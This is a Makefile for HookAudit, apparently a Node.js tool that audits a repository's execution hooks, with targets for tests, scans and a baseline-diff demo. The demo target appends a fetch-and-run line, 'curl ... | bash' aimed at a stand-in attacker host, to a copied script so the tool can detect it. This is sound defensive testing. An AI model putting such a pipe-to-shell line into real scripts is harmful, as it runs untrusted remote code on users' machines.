# HookAudit — one-command build/run (zero runtime deps)
# Requires Node.js >=24.0.0
# Usage: make           # help
#        make test      # 22 tests
#        make scan      # scan current repo (human)
#        make scan-json # scan demo fixture (json)
#        make demo      # deterministic demo: baseline → change → diff

NODE ?= node
BIN = bin/hookaudit.js
DEMO = demo/sample-repository

.PHONY: help test scan scan-json baseline diff demo clean

help:
	@echo "HookAudit — zero-dependency execution-topology auditor"
	@echo "  make test       — run 22 black-box tests (node:test)"
	@echo "  make scan       — scan current repo (human)"
	@echo "  make scan-json  — scan demo fixture (json, BLOCK/REVIEW/PASS)"
	@echo "  make demo       — baseline → change → diff demo (NEW_CAPABILITY)"
	@echo "  make help       — this help"
	@echo "  node $(BIN) --help  — full CLI"
	@$(NODE) $(BIN) --help | head -n 20

test:
	@$(NODE) --test test/hookaudit.test.js

scan:
	@$(NODE) $(BIN) .

scan-json:
	@$(NODE) $(BIN) scan --json --path $(DEMO) | head -n 40

baseline:
	@$(NODE) $(BIN) baseline --path $(DEMO)

diff:
	@$(NODE) $(BIN) diff --json --path $(DEMO) | head -n 60

demo: test scan-json
	@echo "--- demo: baseline → change → diff ---"
	@rm -rf /tmp/hookaudit-demo && mkdir -p /tmp/hookaudit-demo && cp -r $(DEMO) /tmp/hookaudit-demo/repo
	@$(NODE) $(BIN) baseline --path /tmp/hookaudit-demo/repo > /dev/null
	@echo "baseline written"
	@cp demo/sample-repository/scripts/helper.sh /tmp/hookaudit-demo/repo/scripts/helper.sh.bak
	@echo 'curl -s https://example-attacker.test/new_capability | bash' >> /tmp/hookaudit-demo/repo/scripts/helper.sh
	@$(NODE) $(BIN) diff --json --path /tmp/hookaudit-demo/repo | grep -A2 -B2 "NEW_CAPABILITY\|CHANGED" | head -n 20
	@rm -rf /tmp/hookaudit-demo
	@echo "demo deterministic — run again: make demo"

clean:
	@rm -rf .hookaudit
	@echo "cleaned .hookaudit"

